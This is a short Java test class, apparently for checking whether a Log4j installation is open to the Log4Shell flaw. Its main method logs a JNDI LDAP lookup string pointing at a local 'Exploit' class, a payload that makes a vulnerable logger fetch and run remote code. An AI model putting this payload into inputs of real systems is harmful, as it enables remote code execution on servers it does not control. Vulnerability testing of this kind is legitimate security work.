package com.cube007.JavaPlus.other;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import sun.applet.Main;

/**
 * @author liuxiaonan
 */
public class Log4jBugTest {

    private static final Logger LOGGER = LogManager.getLogger(Main.class);

    public static void main(String[] args) {
        LOGGER.error("${jndi:ldap://127.0.0.1:9999/Exploit}");
    }

}
